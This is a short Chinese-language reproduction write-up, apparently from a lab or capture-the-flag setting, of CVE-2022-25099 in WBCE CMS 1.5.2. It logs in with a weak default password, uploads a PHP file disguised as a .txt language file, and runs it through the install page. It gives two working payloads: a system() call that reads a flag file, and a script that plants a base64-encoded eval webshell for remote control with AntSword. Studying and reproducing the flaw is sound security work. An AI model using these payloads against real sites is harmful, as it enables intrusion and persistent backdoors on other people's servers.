## 1. 漏洞介绍
WBCE CMS v1.5.2 /language/install.php 文件存在漏洞，攻击者可精心构造文件上传造成RCE
CVE 介绍：[CVE - CVE-2022-25099](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25099)
## 2. 漏洞复现
开启环境，网上找了下登录地址是 admin/login/index.php，尝试弱口令登录【admin/123456】

![1.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281135460.jpg)

根据 CVE 介绍找语言安装/编辑页面

![2.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281135760.jpg)

漏洞源码：[install.php](https://github.com/WBCE/WBCE_CMS/blob/1.5.2/wbce/admin/languages/install.php)，分析源码可知，install.php 先会检查有没有上传文件，上传的文件是不是 PHP文件等，接着会直接用require载入并运行。

![3.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281203187.jpg)

> 在PHP中require语句作用是包含并运行指定文件，与include的区别：include在引入不存文件时产生一个警告且脚本还会继续执行，而require则会导致一个致命性错误且脚本停止执行。

尝试直接上传 php，未成功，看了官方介绍【[WBCE CMS Help - Languages](https://help.wbce-cms.org/pages/the-backend/add-ons/languages.php)】说需要以txt上传，改后缀重新上传。文件内容可自己随便折腾
### 2.1. 示例-1：直接读取flag

```php
<?php
echo system("cat /flag");
?>
```

![4.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281210503.jpg)

![5.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281210051.jpg)

### 2.2. 示例-2：写个webshell

```php
<?php
$pd='/var/www/html/admin/login/'; #这个路径是通过echo system("pwd");测出来的，步骤有所省略
file_put_contents("$pd".'shell.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWyJzaGVsbCJdKSA/Pg==')); /*<?php @eval($_POST["shell"]) ?> #编码后 PD9waHAgQGV2YWwoJF9QT1NUWyJzaGVsbCJdKSA/Pg==*/
echo system("ls $pd");
?>
```

蚁剑连接

![6.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281209880.jpg)

![7.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281209852.jpg)